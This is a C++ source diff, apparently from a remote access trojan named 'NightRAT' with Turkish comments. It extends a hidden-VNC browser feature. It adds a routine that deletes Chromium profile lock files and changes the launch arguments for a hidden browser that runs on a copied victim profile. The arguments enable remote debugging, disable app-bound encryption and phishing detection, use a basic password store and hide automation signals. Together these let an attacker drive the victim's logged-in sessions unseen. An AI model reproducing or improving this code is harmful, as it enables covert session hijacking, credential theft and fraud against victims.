@@ -1171,6 +1171,30 @@ static bool copy_directory(const wstring& from, const wstring& to) {
     return SHFileOperationW(&op) == 0;
 }
 
+static void remove_chromium_locks(const wstring& directory) {
+    vector<wstring> locks = { L"SingletonLock", L"lock", L"SingletonSocket", L"SingletonCookie" };
+
+    // Basit bir derinlemesine temizlik (User Data ve alt klasörler için)
+    WIN32_FIND_DATAW fd;
+    HANDLE hFind = FindFirstFileW((directory + L"\\*").c_str(), &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                if (wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0) {
+                    remove_chromium_locks(directory + L"\\" + fd.cFileName);
+                }
+            } else {
+                for (const auto& lockName : locks) {
+                    if (_wcsicmp(fd.cFileName, lockName.c_str()) == 0) {
+                        DeleteFileW((directory + L"\\" + fd.cFileName).c_str());
+                    }
+                }
+            }
+        } while (FindNextFileW(hFind, &fd));
+        FindClose(hFind);
+    }
+}
+
 static void launch_browser_background(wstring browserName) {
     send_status("Profiller kopyalanıyor, lütfen bekleyin...");
 
@@ -1198,14 +1222,15 @@ static void launch_browser_background(wstring browserName) {
 
     if (!userDataPath.empty()) {
         // SHFileOperationW copies the folder itself into the destination.
-        // If userDataPath is "...\User Data" and targetDir is "...\Temp\NightRAT_Profile_123"
-        // the result will be "...\Temp\NightRAT_Profile_123\User Data"
         copy_directory(userDataPath, targetDir);
     }
 
     wstring targetUserData = targetDir + L"\\User Data";
 
-    // Modern hVNC için optimize edilmiş Chromium parametreleri (Tüm profiller ve Edge GUI fix)
+    // Dosya kilitlerini kaldır (SingletonLock vb.)
+    remove_chromium_locks(targetUserData);
+
+    // Modern hVNC için optimize edilmiş Chromium parametreleri (Edge ve Chrome GUI tam çözüm)
     wstring args = L" --remote-debugging-port=9222"
                    L" --no-first-run"
                    L" --no-default-browser-check"
@@ -1219,12 +1244,14 @@ static void launch_browser_background(wstring browserName) {
                    L" --disable-setuid-sandbox"
                    L" --force-cpu-draw"
                    L" --new-window"
+                   L" --no-service-autorun"
+                   L" --disable-component-update"
                    L" --disable-background-networking"
                    L" --disable-background-timer-throttling"
                    L" --disable-backgrounding-occluded-windows"
                    L" --disable-client-side-phishing-detection"
                    L" --disable-sync"
-                   L" --disable-features=msEdgeStartupBoost,msEdgeFirstRunExperience,msEdgeWelcomePage,AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,ViewsBrowserExplorationUI,msHubApps,msEdgeCollections"
+                   L" --disable-features=msEdgeStartupBoost,msEdgeFirstRunExperience,msEdgeWelcomePage,AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,ViewsBrowserExplorationUI,msHubApps,msEdgeCollections,msEdgeShopping,msEdgeGuidedSwitch,msEdgePasswordGeneration,msEdgeOverlayScrollbar,msEdgeSidebar,msEdgeShowSharingAndContacts,msEdgeUserFeedback,msEdgeWorkspaces"
                    L" --password-store=basic"
                    L" --disable-blink-features=AutomationControlled"
                    L" --window-size=1280,720";
